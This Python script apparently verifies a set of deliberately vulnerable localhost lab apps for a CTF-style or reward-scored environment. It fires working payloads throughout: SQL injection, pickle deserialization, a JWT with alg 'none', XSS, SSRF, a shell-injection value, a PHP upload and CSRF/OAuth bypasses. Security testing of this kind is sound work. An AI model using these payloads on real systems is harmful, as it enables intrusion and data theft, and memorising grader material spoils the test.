import requests
import sys
import os
import time
import json
import base64
import pickle
import jwt
import hashlib

# Unbuffered output for real-time monitoring
sys.stdout.reconfigure(line_buffering=True)


class VulnerabilityVerifier:
    def __init__(self):
        self.targets = {
            "ecommerce": "http://localhost:5002",
            "social": "http://localhost:5003",
            "banking": "http://localhost:5004",
            "blog": "http://localhost:5005",
            "fileshare": "http://localhost:5006",
        }
        self.sessions = {name: requests.Session() for name in self.targets}
        self.tokens = {name: None for name in self.targets}
        self.results = []

    def log(self, app, vuln, status, reward=0.0, msg=""):
        res = {"app": app, "vuln": vuln, "status": status, "reward": reward, "msg": msg}
        self.results.append(res)
        icon = "✅" if status == "SUCCESS" else "❌"
        msg_str = f" | {msg}" if msg else ""
        print(f"{icon} [{app.upper()}] {vuln}: {status} (Reward: {reward}){msg_str}")

    def api_login(self, app_name, username, password):
        """API based login to get JWT tokens"""
        if app_name == "ecommerce":
            url = f"{self.targets[app_name]}/api/login"
            try:
                r = self.sessions[app_name].post(
                    url,
                    json={"username": username, "password": password},
                    headers={"Accept": "application/json"},
                    timeout=5,
                )
                if r.status_code == 200:
                    data = r.json()
                    self.tokens[app_name] = data.get("token")
                    return True
            except Exception as e:
                print(f"  Error API login ecommerce: {e}")
        elif app_name == "social":
            url = f"{self.targets[app_name]}/api/auth/login"
            try:
                r = self.sessions[app_name].post(
                    url, json={"username": username, "password": password}, timeout=5
                )
                if r.status_code == 200:
                    data = r.json()
                    self.tokens[app_name] = data.get("token")
                    return True
            except Exception as e:
                print(f"  Error API login social: {e}")
        return False

    def login(self, app_name, username, password):
        """Web based login for session cookies"""
        url = f"{self.targets[app_name]}/login"
        try:
            r = self.sessions[app_name].post(
                url, data={"username": username, "password": password}, timeout=5
            )
            if r.status_code == 200 or r.status_code == 302:
                return True
        except Exception as e:
            print(f"  Error logging into {app_name}: {e}")
        return False

    def check_vuln(
        self,
        app_name,
        vuln_name,
        url_path,
        method="GET",
        data=None,
        params=None,
        headers=None,
        cookies=None,
        expected_header="X-Vuln-Confirmed",
        allow_redirects=True,
        use_json=True,
    ):
        url = f"{self.targets[app_name]}{url_path}"
        try:
            session = self.sessions[app_name]
            req_headers = headers or {}

            if self.tokens[app_name]:
                req_headers["Authorization"] = f"Bearer {self.tokens[app_name]}"
            if "Accept" not in req_headers:
                req_headers["Accept"] = "application/json, text/html"

            if method == "GET":
                r = session.get(
                    url,
                    params=params,
                    headers=req_headers,
                    cookies=cookies,
                    timeout=5,
                    allow_redirects=allow_redirects,
                )
            elif method == "DELETE":
                r = session.delete(
                    url,
                    headers=req_headers,
                    cookies=cookies,
                    timeout=5,
                    allow_redirects=allow_redirects,
                )
            else:
                if use_json:
                    r = session.post(
                        url,
                        json=data,
                        headers=req_headers,
                        cookies=cookies,
                        timeout=5,
                        allow_redirects=allow_redirects,
                    )
                else:
                    r = session.post(
                        url,
                        data=data,
                        headers=req_headers,
                        cookies=cookies,
                        timeout=5,
                        allow_redirects=allow_redirects,
                    )

            def check_r(resp):
                if expected_header in resp.headers:
                    return f"Header: {resp.headers[expected_header]}"
                if (
                    "CTF{" in resp.text
                    or "sqli_login_bypass" in resp.text
                    or "sqli_search" in resp.text
                    or "ssrf_success" in resp.text
                ):
                    return "Content Indicator Found"
                if "flag=CTF{" in resp.url:
                    return f"Flag in URL: {resp.url.split('flag=')[-1].split('&')[0]}"
                return None

            for hist_r in r.history:
                msg = check_r(hist_r)
                if msg:
                    self.log(
                        app_name, vuln_name, "SUCCESS", 1.0, msg + " (via History)"
                    )
                    return True

            msg = check_r(r)
            if msg:
                self.log(app_name, vuln_name, "SUCCESS", 1.0, msg)
                return True
            else:
                # Debug failed tests
                debug_msg = (
                    f"Status: {r.status_code} | Headers: {list(r.headers.keys())}"
                )
                if expected_header.lower() in [k.lower() for k in r.headers]:
                    debug_msg += f" | NOTE: Case-insensitive match found!"
                self.log(app_name, vuln_name, "FAILED", 0.0, debug_msg)
                return False
        except Exception as e:
            self.log(app_name, vuln_name, f"ERROR: {e}")
            return False

    def run_ecommerce_tests(self):
        print("\n--- Testing E-Commerce (5002) ---")
        self.check_vuln(
            "ecommerce",
            "SQLi Login (API)",
            "/api/login",
            method="POST",
            data={"username": "admin' OR '1'='1", "password": "any"},
            headers={"Accept": "application/json"},
        )
        self.check_vuln(
            "ecommerce",
            "SQLi Search",
            "/api/products",
            params={"search": "' OR '1'='1"},
        )
        if self.api_login("ecommerce", "john_doe", "password"):
            self.check_vuln("ecommerce", "IDOR Order API", "/api/order/1")
            self.check_vuln("ecommerce", "IDOR User Orders", "/api/user/orders/1")
            self.check_vuln("ecommerce", "Broken Access Control", "/api/admin/users")
        if self.login("ecommerce", "john_doe", "password"):
            self.check_vuln("ecommerce", "IDOR Order View", "/order/1")
        self.check_vuln("ecommerce", "Info Disclosure", "/api/admin/stats")
        self.check_vuln(
            "ecommerce",
            "SAML Bypass",
            "/saml/acs",
            params={"SAMLResponse": "admin@corp.com_signature>valid"},
        )
        exploit_obj = {"user_id": 1, "flag_payload": True}
        pickled = pickle.dumps(exploit_obj)
        exploit = base64.b64encode(pickled).decode()
        self.check_vuln(
            "ecommerce",
            "Insecure Deserialization",
            "/preferences",
            cookies={"prefs": exploit},
            use_json=False,
        )

    def run_social_tests(self):
        print("\n--- Testing Social Media (5003) ---")
        self.check_vuln(
            "social",
            "Weak Password (Reg)",
            "/register",
            method="POST",
            data={
                "username": "testuser_" + str(int(time.time() * 100)),
                "password": "123",
                "email": "test@test.com",
            },
            use_json=False,
        )
        self.check_vuln(
            "social", "SQLi Search", "/api/search", params={"q": "' OR '1'='1"}
        )
        self.check_vuln(
            "social",
            "Predictable Reset Token",
            "/api/password-reset",
            method="POST",
            data={"email": "admin@social.com"},
        )
        self.check_vuln(
            "social",
            "OAuth Bypass",
            "/oauth/callback",
            params={"code": "ATTACKER_CONTROLLED_CODE", "state": "ANY_STATE"},
        )
        if self.api_login("social", "user1", "password123"):
            self.check_vuln("social", "IDOR Messages API", "/api/messages/1")
            self.check_vuln("social", "IDOR Delete", "/api/posts/1", method="DELETE")

        # Initial request to get session
        self.sessions["social"].get(f"{self.targets['social']}/login")
        self.check_vuln(
            "social",
            "Session Fixation",
            "/login",
            method="POST",
            data={"username": "user1", "password": "password123"},
            use_json=False,
        )  # Should work as it sends cookies automatically

    def run_banking_tests(self):
        print("\n--- Testing Banking (5004) ---")
        if self.login("banking", "user_john", "password123"):
            self.check_vuln("banking", "IDOR Account View", "/api/account/1")
            self.check_vuln(
                "banking",
                "CSRF Bypass",
                "/transfer",
                method="POST",
                data={
                    "to_account": "2",
                    "amount": "100",
                    "csrf_token": "EXPLOIT_BYPASS",
                },
                use_json=False,
            )

    def run_blog_tests(self):
        print("\n--- Testing Blog (5005) ---")
        self.check_vuln(
            "blog",
            "Reflected XSS",
            "/api/posts",
            params={"q": "<script>alert(1)</script>"},
        )
        token = jwt.encode({"user": "admin", "role": "admin"}, key="", algorithm="none")
        self.check_vuln(
            "blog", "JWT None Bypass", "/oidc/callback", params={"token": token}
        )
        if self.login("blog", "admin", "admin123"):
            self.check_vuln("blog", "Stored XSS", "/post/1")
            self.check_vuln(
                "blog",
                "SSRF",
                "/import_post",
                method="POST",
                data={"url": "http://127.0.0.1/admin/secrets"},
                use_json=False,
            )

    def run_fileshare_tests(self):
        print("\n--- Testing FileShare (5006) ---")
        self.check_vuln(
            "fileshare",
            "Command Injection",
            "/check_status",
            params={"host": "; echo flag_cmd"},
        )
        if self.login("fileshare", "user", "password"):
            self.check_vuln("fileshare", "IDOR Download", "/api/download/1")
            files = {"file": ("shell.php", "<?php phpinfo(); ?>")}
            url = f"{self.targets['fileshare']}/api/upload"
            try:
                r = self.sessions["fileshare"].post(url, files=files, timeout=5)
                if "X-Vuln-Confirmed" in r.headers:
                    self.log(
                        "fileshare",
                        "Unrestricted Upload",
                        "SUCCESS",
                        1.0,
                        f"Header: {r.headers['X-Vuln-Confirmed']}",
                    )
                else:
                    self.log(
                        "fileshare",
                        "Unrestricted Upload",
                        "FAILED",
                        0.0,
                        f"Status: {r.status_code}",
                    )
            except Exception as e:
                self.log("fileshare", "Unrestricted Upload", f"ERROR: {e}")

    def run_all(self):
        print("=" * 60)
        print("🔍 COMPREHENSIVE VULNERABILITY VERIFICATION (v5.1)")
        print("=" * 60)
        self.run_ecommerce_tests()
        self.run_social_tests()
        self.run_banking_tests()
        self.run_blog_tests()
        self.run_fileshare_tests()
        print("\n" + "=" * 60)
        success = sum(1 for r in self.results if r["status"] == "SUCCESS")
        print(f"SUMMARY: {success}/{len(self.results)} VULNERABILITIES VERIFIED")
        print("=" * 60)


if __name__ == "__main__":
    verifier = VulnerabilityVerifier()
    verifier.run_all()
